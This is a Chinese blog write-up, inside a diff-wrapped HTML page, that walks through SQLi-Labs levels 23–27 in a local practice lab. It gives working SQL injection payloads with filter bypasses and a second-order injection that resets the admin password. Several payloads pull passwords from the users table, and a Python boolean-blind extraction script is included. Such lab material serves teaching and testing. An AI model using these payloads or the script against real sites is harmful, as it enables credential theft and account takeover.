@@ -1,0 +1,398 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="联合注入，注释符过滤绕过之构造闭合，%00 截断、二次注入、报错注入，空格过滤绕过，双写绕过、布尔盲注。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《SQLi-Labs》04. Less 23~28a">
+<meta property="og:url" content="https://blog.lens-shrine.top/2023/10/19/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04.%20Less%2023~28a/index.html">
+<meta property="og:site_name" content="镜坛">
+<meta property="og:description" content="联合注入，注释符过滤绕过之构造闭合，%00 截断、二次注入、报错注入，空格过滤绕过，双写绕过、布尔盲注。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/3b501d027ad74b24aa551d85a8dc646c.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/541ffbca65704d36b91d57db37b23a80.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/510d33fc1eb04cb1b07603d5f81083ef.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/4d0782302e4c48c3baafa98190406829.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/1364d13899224ad1813cac626c605df0.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/f415678cadfa4757a272704004efbacc.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/bb0729e3ea7d4c7eb88265ae85c8f9db.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/a39bc79b4f5a4d0c87e78180632e5d8a.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/3071e2e27737449582009234ecfccb0f.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/269fb4d5552247bf99feb69be623e0a4.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/2786bc5d31694591bc5e37faf7fe3647.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/4f4d53874ebe445d9625e40ce83697eb.png">
+<meta property="article:published_time" content="2023-10-19T11:37:40.000Z">
+<meta property="article:modified_time" content="2023-10-19T11:38:40.000Z">
+<meta property="article:author" content="镜坛主">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/3b501d027ad74b24aa551d85a8dc646c.png"><title>《SQLi-Labs》04. Less 23~28a | 镜坛</title><link ref="canonical" href="https://blog.lens-shrine.top/2023/10/19/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04.%20Less%2023~28a/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: {"avoidBanner":true},
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbtack"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner" style="background: url(/images/backimg/SunsetClimbing.png) no-repeat center/cover;"><div class="header-banner-info"><div class="header-banner-info__title">镜 坛</div><div class="header-banner-info__subtitle">烛明香暗画楼深，满鬓青霜残雪思难任。</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">《SQLi-Labs》04. Less 23~28a</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-10-19</span></span></div></header><div class="post-body"><p>@<a href="SQLi-Labs">TOC</a></p>
+<hr>
+<blockquote>
+<p>靶场部署在 VMware - Win7。</p>
+</blockquote>
+<blockquote>
+<p>靶场地址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs" >https://github.com/Audi-1/sqli-labs</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+
+        <h1 id="索引"   >
+          <a href="#索引" class="heading-link"><i class="fas fa-link"></i></a><a href="#索引" class="headerlink" title="索引"></a>索引</h1>
+      <ul>
+<li><strong>Less-23</strong>：联合注入，注释符过滤绕过之构造闭合，<code>%00</code> 截断，字符型【’】。</li>
+<li><strong>Less-24</strong>：二次注入。字符型【’】。</li>
+<li><strong>Less-25</strong>：联合注入，与 Less-23 思路一致。双写绕过。字符型【’】。</li>
+<li><strong>Less-25a</strong>：与 Less-25 差别不大。数字型。</li>
+<li><strong>Less-26</strong>：报错注入，空格过滤绕过，双写绕过，注释符过滤绕过之构造闭合，<code>%00</code> 截断，字符型【’】。</li>
+<li><strong>Less-26a</strong>：与 Less-26 类似，布尔盲注。字符型【’)】。</li>
+<li><strong>Less-27</strong>：与 Less-26 类似，报错注入。字符型【’】。</li>
+<li><strong>Less-27a</strong>：与 Less-27 类似，联合注入。字符型【”】。</li>
+<li><strong>Less-28</strong>：与前面几题都类似，联合注入。字符型【’)】。</li>
+<li><strong>Less-28a</strong>：与 Less-28 不能说完全相同，只能说一模一样。</li>
+</ul>
+
+        <h1 id="Less-23"   >
+          <a href="#Less-23" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1>
+      <p>思路与 Less1 一致。</p>
+
+        <h2 id="题解"   >
+          <a href="#题解" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解" class="headerlink" title="题解"></a>题解</h2>
+      <p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/3b501d027ad74b24aa551d85a8dc646c.png" alt="在这里插入图片描述"></p>
+<p>Less-23 和 Less-1 很像啊。只不过注释符不再起作用了，猜测注释符被过滤了。</p>
+<p>不过可以通过构造闭合语句来使用联合注入。</p>
+<p><strong>构造闭合</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/541ffbca65704d36b91d57db37b23a80.png" alt="在这里插入图片描述"></p>
+<p><strong>判断回显位</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27; union select 1,2&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27; union select 1,2,3&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27; union select 1,2,3,4&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p>以上语句也可使用 <code>%00</code> 截断。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,3,4; %00</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆库</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p>另一种写法（使用 <code>%00</code> 截断）：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1&#x27; union select 1,(group_concat(schema_name)),3 from information_schema.schemata;%00</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆表</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; ),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>获取敏感数据</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1&#x27; union select 1,(select group_concat(password, &#x27;:&#x27;, username) from users),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="Less-24"   >
+          <a href="#Less-24" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h1>
+      <p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/510d33fc1eb04cb1b07603d5f81083ef.png" alt="在这里插入图片描述"></p>
+
+        <h2 id="题解-1"   >
+          <a href="#题解-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2>
+      <blockquote>
+<p>这题可以使用 name：Dumb，Password：Dumb 登录。</p>
+</blockquote>
+<p>在这里出现了传说中的二次注入。另外，这关的目标是获得 admin 用户的权限。</p>
+<blockquote>
+<p>二次注入一般用于白盒测试，黑盒测试就算找到注入点也不知道能不能攻击。</p>
+</blockquote>
+<p>先直接看过程与分析吧。</p>
+<p>先点击注册用户，注册 admin，提示用户已存在。</p>
+<p>那就注册一个用户 <code>admin&#39;#</code>，密码随便。</p>
+<p>注册之后可以看到注册的用户已插入数据库。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/4d0782302e4c48c3baafa98190406829.png" alt="在这里插入图片描述"></p>
+<p>此时使用 <code>admin&#39;#</code> 用户登录并修改密码，这里修改为 <code>hello6</code>。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/1364d13899224ad1813cac626c605df0.png" alt="在这里插入图片描述"></p>
+<p>修改后再次查看数据库，可以看到 <code>admin&#39;#</code> 用户密码没变，但 <code>admin</code> 用户的密码被更改了。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/f415678cadfa4757a272704004efbacc.png" alt="在这里插入图片描述"></p>
+<p>admin 密码都能自定义了，权限自然唾手可得了。</p>
+<p>任务完成。</p>
+<p>最后看看修改密码时发生了什么。看下源码。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/bb0729e3ea7d4c7eb88265ae85c8f9db.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></div></figure>
+
+<p>由于信任数据库存放的信息，用户名代入时未作过滤。</p>
+<p>所以代入以上构造的数据时 SQL 语句就是：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;hello6&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;admin原来的密码&#x27; &quot;</span>;</span><br></pre></td></tr></table></div></figure>
+
+<p>语句注释后就成了修改 <code>admin</code> 用户密码的操作。</p>
+
+        <h2 id="总结"   >
+          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+      <p>二次注入：将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 sql 注入。</p>
+<blockquote>
+<p>二次注入一般用于白盒测试，黑盒测试就算找到注入点也不知道能不能攻击。</p>
+</blockquote>
+
+        <h1 id="Less-25"   >
+          <a href="#Less-25" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1>
+      
+        <h2 id="题解-2"   >
+          <a href="#题解-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2>
+      <p>根据提示，先测试一下：</p>
+<p><strong>爆库</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3  or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/a39bc79b4f5a4d0c87e78180632e5d8a.png" alt="在这里插入图片描述"></p>
+<p>“ or ” 被过滤了。不过只被过滤了一次。双写绕过即可。</p>
+<blockquote>
+<p>也可以使用 <code>||</code> 与 <code>&amp;&amp;</code></p>
+</blockquote>
+<p><strong>爆库</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1&#x27; union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3 oorr &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/3071e2e27737449582009234ecfccb0f.png" alt="在这里插入图片描述"></p>
+<p>剩下的过程参考 Less-23 即可。</p>
+
+        <h1 id="Less-25a"   >
+          <a href="#Less-25a" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1>
+      
+        <h2 id="题解-3"   >
+          <a href="#题解-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-3" class="headerlink" title="题解"></a>题解</h2>
+      <p>这题与 Less-25 没什么两样，区别在于是数字型注入，且数据库报错信息被过滤了一些。</p>
+<p><strong>爆库</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1 union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3 oorr 1=1</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/269fb4d5552247bf99feb69be623e0a4.png" alt="在这里插入图片描述"></p>
+<p>剩下的过程参考 Less-23 即可。</p>
+
+        <h1 id="Less-26"   >
+          <a href="#Less-26" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1>
+      
+        <h2 id="题解-4"   >
+          <a href="#题解-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-4" class="headerlink" title="题解"></a>题解</h2>
+      <p>测试一下。</p>
+<p><strong>爆库</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1&#x27; union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3 oorr &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/2786bc5d31694591bc5e37faf7fe3647.png" alt="在这里插入图片描述"></p>
+<p>这一关过滤了注释符、空格、or、and。</p>
+<p>“ or ” 的过滤可以双写绕过，注释符过滤可以构造闭合绕过。只要解决了空格过滤就和 Less-23 没什么两样了。</p>
+<p>这一关原本是考察 Apache 的解析问题。但 windows 下无法复现。</p>
+<p>补充一下空格绕过的方法，可以用以下字符代替：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09    TAB 键（水平）</span><br><span class="line">%0a    新建一行</span><br><span class="line">%0c    新的一页</span><br><span class="line">%0d    return 功能</span><br><span class="line">%0b    TAB 键（垂直）</span><br><span class="line">%a0    空格</span><br></pre></td></tr></table></div></figure>
+
+<p>不过由于平台问题以上绕过 Apache 解析不了，所以也可以通过灵活使用括号【<code>(</code>】来绕过空格。</p>
+<p><strong>判断字符类型</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27;              报错</span><br><span class="line">url + ?id=1&#x27;oorr&#x27;1&#x27;=&#x27;1    回显正常</span><br><span class="line">url + ?id=1&#x27;;%00          回显正常</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04/4f4d53874ebe445d9625e40ce83697eb.png" alt="在这里插入图片描述"></p>
+<p>为单引号字符型。</p>
+<p><strong>判断回显位</strong>。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27;union(select(1));%00            报错</span><br><span class="line">url + ?id=1&#x27;union(select(1),(2));%00        报错</span><br><span class="line">url + ?id=1&#x27;union(select(1),(2),(3));%00    回显正常</span><br></pre></td></tr></table></div></figure>
+
+<p>不过报错注入空格使用比较少，所以直接上报错注入。</p>
+<p><strong>爆表</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1))||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;aandnd(table_name=&#x27;users&#x27;)))),1))||&#x27;0</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆敏感信息</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||&#x27;0</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="总结-1"   >
+          <a href="#总结-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2>
+      <ul>
+<li>报错注入，详情参考 Less-17。</li>
+<li>空格过滤绕过。</li>
+<li>双写绕过。</li>
+<li>构造闭合绕过。</li>
+</ul>
+
+        <h1 id="Less-26a"   >
+          <a href="#Less-26a" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1>
+      
+        <h2 id="题解-5"   >
+          <a href="#题解-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-5" class="headerlink" title="题解"></a>题解</h2>
+      <p>这题与 Less-26 类似，但是不显示报错信息，使用布尔盲注。</p>
+<p><strong>爆表</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=100&#x27;)||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&quot;security&quot;)),1,1))&gt;80,1,0)||(&#x27;0</span><br><span class="line">url + ?id=100&#x27;)||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&quot;security&quot;)),2,1))&gt;100,1,0)||(&#x27;0</span><br><span class="line">...</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=100&#x27;)||if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&quot;security&quot;)),1,1))&gt;80,1,0)%23||(&#x27;0</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆敏感信息</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=100&#x27;)||if(ascii(substr((select(group_concat(username,&quot;:&quot;,passwoorrd))from(security.users)),1,1))&gt;80,1,0)%23||(&#x27;0</span><br></pre></td></tr></table></div></figure>
+
+<p>这里附上一个布尔盲注自动化脚本：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.8.222/lab/sqli/Less-26a/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&quot;security&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database()&amp;&amp;table_name=&quot;users&quot;)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(username,&quot;:&quot;,passwoorrd))from(security.users)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">f&quot;100&#x27;)||<span class="subst">&#123;payload&#125;</span>||(&#x27;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Dumb&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="Less-27"   >
+          <a href="#Less-27" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1>
+      
+        <h2 id="题解-6"   >
+          <a href="#题解-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-6" class="headerlink" title="题解"></a>题解</h2>
+      <p>Less-27 没有过滤 and 和 or，过滤了 select 和 union，不过可以大小写绕过以及双写绕过。其他的和 Less-26 差不多</p>
+<p>这里直接上报错注入。</p>
+<p><strong>爆表</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1))or&#x27;0</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段</strong>：</p>
